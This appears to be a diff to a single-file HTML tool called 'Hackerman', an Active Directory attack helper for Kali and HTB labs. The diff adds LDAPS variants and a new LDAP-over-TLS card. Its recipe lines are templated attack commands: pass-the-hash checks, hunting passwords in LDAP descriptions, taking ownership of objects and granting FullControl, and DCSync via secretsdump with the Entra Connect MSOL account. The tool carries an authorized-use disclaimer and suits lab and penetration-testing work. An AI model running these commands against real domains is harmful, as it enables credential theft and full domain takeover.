@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hackerman v1.12.0 — AD Attack Helper (Kali · HTB)</title>
+<title>Hackerman v1.13.0 — AD Attack Helper (Kali · HTB)</title>
 <style>
 :root{
   --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
@@ -221,7 +221,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
 
 <header>
   <div class="hwrap">
-    <div class="brand">Hackerman <b>v1.12.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="brand">Hackerman <b>v1.13.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
     <div class="hactions">
       <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
       <button id="presetSave" title="Save current context as preset">Save</button>
@@ -276,7 +276,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
   <section id="tab-legend" class="tab"></section>
 </main>
 
-<footer class="mono">Hackerman v1.12.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+<footer class="mono">Hackerman v1.13.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
 
 <div id="focusOverlay" class="hidden">
   <div id="focusBox" role="dialog" aria-modal="true" tabindex="-1" aria-label="recipe focus">
@@ -324,16 +324,16 @@ const VAR_DEFS = [
   {k:'dc_host',     label:'DC host',       ph:'prod-dc',                   grp:'Domain / DC', color:'v-host', req:1, tip:'short hostname of the DC from recon (<span class="mono">nmap -sV</span>, SMB banner, BloodHound)'},
   {k:'dc_fqdn',     label:'DC FQDN',       ph:'prod-dc.argon.htb',         grp:'Domain / DC', color:'v-host', derive:s=>s.dc_host?(s.dc_host.includes('.')?s.dc_host:(s.domain?s.dc_host+'.'+s.domain:s.dc_host)):'', src:['dc_host','domain'], hint:"dc_host + '.' + domain"},
   {k:'dc_ip',       label:'DC IP',         ph:'172.16.6.100',              grp:'Domain / DC', color:'v-ip', req:1, tip:'IP of the DC from recon or the challenge scope'},
-  {k:'dc_dn',       label:'DC DN',         ph:'CN=PROD-DC,OU=DOMAIN CONTROLLERS,DC=ARGON,DC=HTB', grp:'Domain / DC', color:'v-host', tip:'distinguishedName of the DC: <span class="mono">bloodyad get object "DC01$" --attr distinguishedName</span> or ldapsearch'},
+  {k:'dc_dn',       label:'DC DN',         ph:'CN=PROD-DC,OU=DOMAIN CONTROLLERS,DC=ARGON,DC=HTB', grp:'Domain / DC', color:'v-host', tip:'distinguishedName of the DC: <span class="mono">bloodyad get object "DC01$" --attr distinguishedName</span> or <span class="mono">ldapsearch -H ldaps://&lt;dc&gt;</span>'},
   {k:'trust_domain',label:'Trust domain', ph:'htb.local',                 grp:'Domain / DC', color:'v-domain', tip:'FQDN of the partner domain: <span class="mono">bloodyad get trusts</span> / <span class="mono">nxc ldap --dc-list</span> / Windows: <span class="mono">nltest /domain_trusts</span>'},
   {k:'trust_dc_ip', label:'Trust DC IP',  ph:'172.16.6.200',              grp:'Domain / DC', color:'v-ip', tip:'IP of the trusted domain DC (trust-enum recipe: <span class="mono">--dc-list</span>, DNS, or given)'},
-  {k:'trust_netbios',label:'Trust NetBIOS',ph:'HTB',                      grp:'Domain / DC', color:'v-domain', tip:'NetBIOS (flatName) of the partner: <span class="mono">nxc ldap &lt;dc&gt; -u .. -p .. --dc-list</span> or <span class="mono">ldapsearch ... (objectClass=trustedDomain) flatName</span>'},
+  {k:'trust_netbios',label:'Trust NetBIOS',ph:'HTB',                      grp:'Domain / DC', color:'v-domain', tip:'NetBIOS (flatName) of the partner: <span class="mono">nxc ldap &lt;dc&gt; -u .. -p .. --dc-list</span> or <span class="mono">ldapsearch -H ldaps://&lt;dc&gt; ... (objectClass=trustedDomain) flatName</span>'},
   {k:'target_host', label:'Target host',   ph:'prod-sql',                  grp:'Target', color:'v-host', req:1, tip:'short hostname of the machine you attack next (recon / BloodHound sessions)'},
   {k:'target_fqdn', label:'Target FQDN',   ph:'prod-sql.argon.htb',        grp:'Target', color:'v-host', derive:s=>s.target_host?(s.target_host.includes('.')?s.target_host:(s.domain?s.target_host+'.'+s.domain:s.target_host)):'', src:['target_host','domain'], hint:"target_host + '.' + domain"},
   {k:'target_ip',   label:'Target IP',     ph:'172.16.6.50',               grp:'Target', color:'v-ip', tip:'IP of the next target (recon / BloodHound)'},
   {k:'target_user', label:'Impersonate',   ph:'Administrator',             grp:'Target', color:'v-user', tip:'account to impersonate / act as (e.g. Administrator, or the account you recreate)'},
-  {k:'spn',         label:'SPN',           ph:'MSSQLSvc/PROD-SQL',         grp:'Target', color:'v-spn', tip:'SPN to target: <span class="mono">impacket-GetUserSPNs -request</span>, <span class="mono">ldapsearch ... servicePrincipalName</span>, or <span class="mono">addspn.py -q</span>'},
-  {k:'dn',          label:'Target DN',     ph:'CN=PROD-SQL,CN=COMPUTERS,DC=ARGON,DC=HTB', grp:'Target', color:'v-host', tip:'target object DN: <span class="mono">bloodyad get object "NAME" --attr distinguishedName</span> or ldapsearch on sAMAccountName'},
+  {k:'spn',         label:'SPN',           ph:'MSSQLSvc/PROD-SQL',         grp:'Target', color:'v-spn', tip:'SPN to target: <span class="mono">impacket-GetUserSPNs -request</span>, <span class="mono">ldapsearch -H ldaps://&lt;dc&gt; ... servicePrincipalName</span>, or <span class="mono">addspn.py -q</span>'},
+  {k:'dn',          label:'Target DN',     ph:'CN=PROD-SQL,CN=COMPUTERS,DC=ARGON,DC=HTB', grp:'Target', color:'v-host', tip:'target object DN: <span class="mono">bloodyad get object "NAME" --attr distinguishedName</span> or <span class="mono">ldapsearch -H ldaps://&lt;dc&gt;</span> on sAMAccountName'},
   {k:'user',        label:'User',          ph:'eric.dutton',               grp:'Access', color:'v-user', req:1, tip:'your foothold / a valid domain account (writeup, spray, previous dump)'},
   {k:'victim',      label:'Victim acct',   ph:'svc_web',                   grp:'Access', color:'v-user', tip:'account whose hash/credential you found (secretsdump, BloodHound, poisoning)'},
   {k:'password',    label:'Password',      ph:'…',                         grp:'Access', color:'v-secret', tip:'plaintext from spraying, cracked Kerberos hashes, or the challenge notes'},
@@ -354,7 +354,7 @@ const VAR_DEFS = [
   {k:'ca',          label:'CA name',       ph:'argon-CA',                  grp:'Attack params', color:'v-spn', tip:'CA name from <span class="mono">certipy find -u .. -p .. -dc-ip ..</span> ("CA Name")'},
   {k:'ca_host',     label:'CA host',       ph:'prod-dc.argon.htb',         grp:'Attack params', color:'v-host', tip:'DNS host of the CA from certipy find ("DNS Name")'},
   {k:'template',    label:'Cert template', ph:'WebServer',                 grp:'Attack params', color:'v-spn', tip:'certificate template name from certipy find (e.g. a vulnerable ESC1 template)'},
-  {k:'group',       label:'Group',         ph:'Domain Admins',             grp:'Attack params', color:'v-user', tip:'target group: <span class="mono">nxc ldap --groups</span> / <span class="mono">ldapsearch (objectClass=group)</span>'},
+  {k:'group',       label:'Group',         ph:'Domain Admins',             grp:'Attack params', color:'v-user', tip:'target group: <span class="mono">nxc ldap --groups</span> / <span class="mono">ldapsearch -H ldaps://&lt;dc&gt; (objectClass=group)</span>'},
   {k:'wordlist',    label:'Wordlist',      ph:'/usr/share/wordlists/rockyou.txt', grp:'Attack params', color:'v-file', tip:'cracking wordlist, e.g. <span class="mono">/usr/share/wordlists/rockyou.txt</span>'},
   {k:'keytab',      label:'Keytab file',   ph:'/etc/krb5.keytab',          grp:'Attack params', color:'v-file', tip:'extracted keytab file: <span class="mono">find / -name "*.keytab"</span>; inspect with <span class="mono">klist -k -t</span>'},
   {k:'hashfile',    label:'Hash out file', ph:'hashes.txt',                grp:'Attack params', color:'v-file', tip:'output file for dumped hashes (feeds hashcat)'},
@@ -1162,7 +1162,7 @@ function renderLegend(){
   const tab = $('#tab-legend');
   tab.innerHTML = '';
   const about = document.createElement('div');
-  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.12.0</h2>' +
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.13.0</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
     RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries. Offline, no dependencies, no telemetry.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
@@ -1437,10 +1437,11 @@ R({id:'auth-check',cat:'recon',title:'Verify credentials across protocols',desc:
 cmds:[
  [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}'`,'SMB against DC'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}'`,'LDAP against DC'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --port 636`,'LDAPS (636) — TLS; nxc auto-falls back on signing-required'],
  [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}'`,'WinRM'],
  [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --local-auth`,'local account check'],
  [`nxc mssql {{target_host}} -u '{{user}}' -p '{{password}}' -d {{domain}}`,'MSSQL']
-],note:'<b>Pwn3d!</b> in nxc output = local admin (or DA on DC). Add <span class="mono">-d {{domain}}</span> whenever the short name is ambiguous.'});
+],note:'<b>Pwn3d!</b> in nxc output = local admin (or DA on DC). Add <span class="mono">-d {{domain}}</span> whenever the short name is ambiguous. LDAP: <span class="mono">--port 636</span> switches to LDAPS, which is also the automatic fallback when the DC enforces signing.'});
 
 R({id:'pth-check',cat:'recon',title:'Pass-the-Hash auth checks',desc:'NTLM hash instead of a password — no cracking needed.',
 cmds:[
@@ -1520,15 +1521,25 @@ R({id:'ldap-dump',cat:'recon',title:'LDAP dump — offline browsing',desc:'Pull 
 cmds:[
  [`ldapdomaindump -u '{{domain}}\\{{user}}' -p '{{password}}' {{dc_ip}}`,'dump to ./domain_*.* (HTML/JSON/CSV)'],
  [`ldapdomaindump -u '{{domain}}\\{{user}}' -p '{{password}}' -o ldap-loot --no-html {{dc_ip}}`,'JSON/CSV only'],
- [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(objectClass=user)' sAMAccountName description`,'raw LDAP query'],
- [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(description=*pass*)'`,'grep descriptions for passwords'],
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(objectClass=user)' sAMAccountName description`,'raw LDAP query over LDAPS'],
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(description=*pass*)'`,'grep descriptions for passwords'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --query '(objectClass=user)' sAMAccountName,description`,'nxc query (version dependent)']
-],note:'The HTML report opens in a browser and beats scrolling through LDAP output. <span class="mono">--query</span> module availability varies by NetExec version — fall back to ldapsearch.'});
+],note:'The HTML report opens in a browser and beats scrolling through LDAP output. <span class="mono">--query</span> module availability varies by NetExec version — fall back to ldapsearch.<br>All <span class="mono">ldapsearch</span> lines run over <b>LDAPS (636)</b> with <span class="mono">LDAPTLS_REQCERT=never</span> (self-signed DC certs); if 636 is closed use <span class="mono">-H ldap://{{dc_ip}} -ZZ</span> (STARTTLS) — see the LDAP over TLS card.'});
+
+R({id:'ldap-tls',cat:'recon',title:'LDAP over TLS — LDAPS vs STARTTLS',desc:'Wrap LDAP in TLS so simple binds do not travel in cleartext and signing-enforced DCs accept you. LDAPS (636) first, STARTTLS (389) as fallback.',
+cmds:[
+ [`nmap -p 389,636,3268,3269 {{dc_ip}}`,'which LDAP ports are open','n'],
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -s base -b '' defaultNamingContext dnsHostName`,'anonymous RootDSE over LDAPS (636)'],
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(objectClass=user)' sAMAccountName`,'password bind over LDAPS — no cleartext on the wire'],
+ [`openssl s_client -connect {{dc_fqdn}}:636 -showcerts </dev/null 2>/dev/null | openssl x509 -outform PEM > dc.pem`,'grab the DC certificate','n'],
+ [`LDAPTLS_CACERT=dc.pem ldapsearch -x -H ldaps://{{dc_fqdn}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(objectClass=user)' sAMAccountName`,'verify against the grabbed cert instead of REQCERT=never']
+],note:'<b>LDAPS (636)</b> wraps the whole session and is what this tool uses everywhere. <span class="mono">LDAPTLS_REQCERT=never</span> skips certificate verification (DC certs are usually self-signed); after the openssl grab, <span class="mono">LDAPTLS_CACERT=dc.pem</span> is the clean variant. <b>Fallback if 636 is closed</b> (DC has no cert): <span class="mono">ldapsearch -x -H ldap://{{dc_ip}} -ZZ …</span> — STARTTLS upgrades port 389, same env var. Why it matters: simple binds on 389 send the password in cleartext, and Windows Server 2025 enforces LDAP signing by default (plain binds rejected). Tool support: <span class="mono">nxc ldap … --port 636</span> (nxc also auto-falls back to LDAPS on signing-required), <span class="mono">bloodyAD … -s</span> (<span class="mono">-ss</span>/<span class="mono">-sss</span> relax signing/CBT for debug), certipy defaults to LDAPS (<span class="mono">-ldap-scheme ldap</span> opts out), impacket <span class="mono">-use-ldaps</span> (dacledit, rbcd, owneredit; <span class="mono">addcomputer -method LDAPS</span>). No TLS flag (389 only): ldapdomaindump, bloodhound-python, impacket-GetADUsers.'});
 
 /* ===== BLOODYAD ===== */
 R({id:'bloodyad-basics',cat:'bloodyad',title:'bloodyAD — auth & object reads',desc:'Swiss army knife for LDAP writes. Three auth styles: password, NT hash, Kerberos.',
 cmds:[
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}' --attr sAMAccountName,userAccountControl`,'password auth + read'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' -s get object '{{user}}' --attr sAMAccountName,userAccountControl`,'same over LDAPS (-s; -ss/-sss relax signing/CBT)'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' get object '{{user}}'`,'pass-the-hash (-p :NTHASH)'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{user}}'`,'kerberos ccache'],
  [`bloodyad --host {{dc_fqdn}} -d {{domain}} -u '{{user}}' -k keytab={{keytab}} -f aes get object '{{user}}'`,'kerberos keytab'],
@@ -1765,6 +1776,7 @@ cmds:[
 R({id:'rbcd-read',cat:'deleg',title:'RBCD step 1 — read current delegation state',desc:'See who (if anyone) is already allowed to act on behalf of the target computer.',
 cmds:[
  [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}:{{password}}'`,'read RBCD entry'],
+ [`impacket-rbcd -use-ldaps -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}:{{password}}'`,'read over LDAPS (636)'],
  [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}' -hashes ':{{nthash}}'`,'read via PtH'],
  [`KRB5CCNAME={{ccache}} impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}' -k -no-pass`,'read via ccache'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity`,'bloodyAD read'],
@@ -1871,7 +1883,7 @@ cmds:[
  [`KRB5CCNAME={{ccache}} certipy find -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -vulnerable -stdout`,'via ccache'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M adcs`,'nxc module'],
  [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -bloodhound`,'export for BloodHound']
-],note:'Look for <b>ESC1/ESC6/ESC8</b> first. Template flagged with <span class="mono">Enrollee Supplies Subject: True</span> + Client Auth = ESC1; CA with Web Enrollment/HTTP endpoints = ESC8 (relay); EDITF_ATTRIBUTESUBJECTALTNAME2 = ESC6. The remaining ESC1-17 paths have dedicated cards: <b>ESC2/3, ESC4, ESC5/12/14, ESC7, ESC9/16, ESC10, ESC11, ESC13, ESC15, ESC17</b> plus golden certificate.'});
+],note:'Look for <b>ESC1/ESC6/ESC8</b> first. Template flagged with <span class="mono">Enrollee Supplies Subject: True</span> + Client Auth = ESC1; CA with Web Enrollment/HTTP endpoints = ESC8 (relay); EDITF_ATTRIBUTESUBJECTALTNAME2 = ESC6. The remaining ESC1-17 paths have dedicated cards: <b>ESC2/3, ESC4, ESC5/12/14, ESC7, ESC9/16, ESC10, ESC11, ESC13, ESC15, ESC17</b> plus golden certificate. Certipy 5.x talks to LDAP over <b>LDAPS (636)</b> by default — opt out with <span class="mono">-ldap-scheme ldap</span> if the DC has no certificate.'});
 
 R({id:'adcs-esc1',cat:'adcs',title:'ADCS — ESC1 (impersonate via UPN)',desc:'Request a certificate as any user because the template allows a supplied SAN and client auth.',
 cmds:[
@@ -2001,19 +2013,20 @@ cmds:[
  [`impacket-dacledit -action read -principal '{{user}}' -target-dn 'CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'ESC5: who can edit NTAuthCertificates?'],
  [`impacket-dacledit -action read -principal '{{user}}' -target-dn 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'ESC5: template container ACLs'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'find writable PKI objects (look for Public Key Services)'],
- [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(altSecurityIdentities=*)' sAMAccountName altSecurityIdentities`,'ESC14: explicit certificate mappings'],
- [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '(msDS-OIDToGroupLink=*)' msDS-OIDToGroupLink`,'ESC13 context: linked OID groups']
-],note:'<b>ESC5</b>: write rights on PKI objects (NTAuthCertificates, AIA/CDP containers, CA/template objects) let you alter trust — publishing a rogue CA in NTAuthCertificates then forging with its key (needs Windows tooling like certutil -dspublish / Set-Acl). <b>ESC12</b>: only relevant for a YubiHSM2-backed CA where a low-privileged shell on the CA can force HSM signatures — no Certipy support. <b>ESC14</b>: weak altSecurityIdentities (CN-only, generic issuer, RFC822) can be matched by a certificate you obtain — authenticate with <span class="mono">certipy auth -pfx <cert> -username <mapped user></span>.'});
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(altSecurityIdentities=*)' sAMAccountName altSecurityIdentities`,'ESC14: explicit certificate mappings'],
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '(msDS-OIDToGroupLink=*)' msDS-OIDToGroupLink`,'ESC13 context: linked OID groups']
+],note:'<b>ESC5</b>: write rights on PKI objects (NTAuthCertificates, AIA/CDP containers, CA/template objects) let you alter trust — publishing a rogue CA in NTAuthCertificates then forging with its key (needs Windows tooling like certutil -dspublish / Set-Acl). <b>ESC12</b>: only relevant for a YubiHSM2-backed CA where a low-privileged shell on the CA can force HSM signatures — no Certipy support. <b>ESC14</b>: weak altSecurityIdentities (CN-only, generic issuer, RFC822) can be matched by a certificate you obtain — authenticate with <span class="mono">certipy auth -pfx <cert> -username <mapped user></span>.<br>Both queries run over <b>LDAPS (636)</b> with <span class="mono">LDAPTLS_REQCERT=never</span>; if 636 is closed use <span class="mono">-H ldap://{{dc_ip}} -ZZ</span> (STARTTLS) — see the LDAP over TLS card.'});
 
 /* ===== ACL / DACL ABUSE ===== */
 R({id:'dacl-enum',cat:'dacl',title:'Enumerate ACLs on an object',desc:'Read the security descriptor and find abusable rights (GenericAll, WriteDACL, WriteOwner, ForceChangePassword, AddSelf).',
 cmds:[
  [`impacket-dacledit -action read -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'dacledit read (user)'],
+ [`impacket-dacledit -use-ldaps -action read -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'same over LDAPS (636)'],
  [`KRB5CCNAME={{ccache}} impacket-dacledit -action read -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'dacledit read via ccache'],
  [`impacket-dacledit -action read -principal '{{user}}' -target '{{target_host}}$' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'dacledit read (computer)'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_user}}' --resolve-sd`,'bloodyAD resolve SD'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'all my write rights']
-],note:'BloodHound equivalents: <span class="mono">GenericAll</span>, <span class="mono">GenericWrite</span>, <span class="mono">WriteDacl</span>, <span class="mono">WriteOwner</span>, <span class="mono">ForceChangePassword</span>, <span class="mono">AddSelf</span>, <span class="mono">AddKeyCredentialLink</span> edges.'});
+],note:'BloodHound equivalents: <span class="mono">GenericAll</span>, <span class="mono">GenericWrite</span>, <span class="mono">WriteDacl</span>, <span class="mono">WriteOwner</span>, <span class="mono">ForceChangePassword</span>, <span class="mono">AddSelf</span>, <span class="mono">AddKeyCredentialLink</span> edges. impacket LDAP tools take <span class="mono">-use-ldaps</span> (dacledit, rbcd, owneredit) — the TLS default; certipy already defaults to LDAPS.'});
 
 R({id:'dacl-genericall-user',cat:'dacl',title:'GenericAll on user — takeover options',desc:'Full control over a user object. Pick the least destructive path that gets you in.',
 cmds:[
@@ -2067,6 +2080,7 @@ cmds:[
 R({id:'dacl-writeowner',cat:'dacl',title:'WriteOwner / ownership takeover',desc:'Take ownership first, then grant yourself WriteDACL and continue.',
 cmds:[
  [`impacket-owneredit -action write -new-owner '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'take ownership (impacket)'],
+ [`impacket-owneredit -use-ldaps -action write -new-owner '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'take ownership over LDAPS (636)'],
  [`KRB5CCNAME={{ccache}} impacket-owneredit -action write -new-owner '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'take ownership via ccache'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set owner '{{target_user}}' '{{user}}'`,'take ownership (bloodyAD)'],
  [`impacket-dacledit -action write -rights FullControl -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'grant FullControl as new owner'],
@@ -2482,7 +2496,7 @@ cmds:[
 
 R({id:'entra-connect',cat:'post',title:'Entra ID Connect — MSOL/ADSync account abuse',desc:'Hybrid identity: the Azure AD Connect server stores the AD DS connector account (MSOL_*) whose password gives DCSync rights.',
 cmds:[
- [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(sAMAccountName=MSOL_*)' sAMAccountName,description,distinguishedName`,'find the AD DS connector account'],
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(sAMAccountName=MSOL_*)' sAMAccountName,description,distinguishedName`,'find the AD DS connector account'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --query '(sAMAccountName=MSOL_*)' sAMAccountName,servicePrincipalName`,'nxc variant (version dependent)'],
  [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'dir "C:\\Program Files\\Microsoft Azure AD Sync\\Data"'`,'locate the ADSync database on the sync server'],
  [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M spider_plus`,'spider shares for sync configs and scripts'],
@@ -2490,7 +2504,7 @@ cmds:[
  [`roadrecon gather`,'enumerate tenant users, groups, apps and roles'],
  [`roadrecon gui`,'browse the collected data locally','n'],
  [`impacket-secretsdump '{{domain}}/<MSOL_ACCOUNT>:<PASSWORD>@{{dc_host}}' -just-dc`,'DCSync with the connector account']
-],note:'The MSOL_* connector account usually holds <span class="mono">Replicating Directory Changes</span>. Its password lives on the AD Connect server in the ADSync database (WID/SQL) or via <span class="mono">Get-AADIntSyncCredentials</span> (AADInternals, Windows). Cloud side: ROADtools/AADInternals with credentials or a stolen refresh token. Also check ADFS (separate card) and password hash sync as alternative persistence.'});
+],note:'The MSOL_* connector account usually holds <span class="mono">Replicating Directory Changes</span>. Its password lives on the AD Connect server in the ADSync database (WID/SQL) or via <span class="mono">Get-AADIntSyncCredentials</span> (AADInternals, Windows). Cloud side: ROADtools/AADInternals with credentials or a stolen refresh token. Also check ADFS (separate card) and password hash sync as alternative persistence.<br>The lookup runs over <b>LDAPS (636)</b> with <span class="mono">LDAPTLS_REQCERT=never</span>; fallback: <span class="mono">-H ldap://{{dc_ip}} -ZZ</span> (STARTTLS) — see the LDAP over TLS card.'});
 
 R({id:'adfs-goldensaml',cat:'post',title:'AD FS — Golden SAML (token signing key)',desc:'Compromise the ADFS server, extract the token-signing key and forge SAML tokens for any federated app — MFA included.',
 cmds:[
@@ -2568,12 +2582,12 @@ cmds:[
  [`nltest /domain_trusts /all_trusts /v`,'from a Windows session','n'],
  [`nltest /trusted_domains`,'quick list of trusted domains','n'],
  [`netdom trust {{domain}} /domain:{{trust_domain}} /verify`,'verify the trust + show direction','n'],
- [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=System,{{domain_dn}}' '(objectClass=trustedDomain)' trustPartner,flatName,securityIdentifier,trustDirection,trustAttributes,trustType`,'FQDN + NetBIOS (flatName) + domain SID of the trust partner'],
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=System,{{domain_dn}}' '(objectClass=trustedDomain)' trustPartner,flatName,securityIdentifier,trustDirection,trustAttributes,trustType`,'FQDN + NetBIOS (flatName) + domain SID of the trust partner'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --get-sid`,'SID of YOUR domain'],
  [`nxc ldap {{trust_dc_ip}} -u '{{user}}' -p '{{password}}' --get-sid`,'SID of the TRUSTED domain'],
  [`Get-ADTrust -Filter *`,'PowerShell (RSAT)','n'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --dc-list`,'DCs of current + trusted domains incl. trust attributes (replaces -M enum_trusts)']
-],note:'Mapping: <span class="mono">flatName</span> = NetBIOS of the trusted domain, <span class="mono">securityIdentifier</span> = its domain SID, <span class="mono">trustPartner</span> = its FQDN. <span class="mono">--get-sid</span> prints the SID of whichever DC you point it at (your DC = own SID, trusted DC = target SID for extra-sid). <span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. The old <span class="mono">-M enum_trusts</span> module is removed in current NetExec — <span class="mono">--dc-list</span> lists the DCs plus the trust attributes. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card.<br>Next steps: cross-domain roasting, SID history, foreign group membership.'});
+],note:'Mapping: <span class="mono">flatName</span> = NetBIOS of the trusted domain, <span class="mono">securityIdentifier</span> = its domain SID, <span class="mono">trustPartner</span> = its FQDN. <span class="mono">--get-sid</span> prints the SID of whichever DC you point it at (your DC = own SID, trusted DC = target SID for extra-sid). <span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. The old <span class="mono">-M enum_trusts</span> module is removed in current NetExec — <span class="mono">--dc-list</span> lists the DCs plus the trust attributes. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card.<br>Next steps: cross-domain roasting, SID history, foreign group membership.<br>Queries run over <b>LDAPS (636)</b> (<span class="mono">LDAPTLS_REQCERT=never</span>); fallback: <span class="mono">-H ldap://{{dc_ip}} -ZZ</span> (STARTTLS) — see the LDAP over TLS card.'});
 
 R({id:'trust-raisechild',cat:'trust',title:'Child → parent: raiseChild / trust key',desc:'From a compromised child domain, escalate to the parent with the inter-realm trust key.',
 cmds:[
@@ -2615,13 +2629,13 @@ cmds:[
 
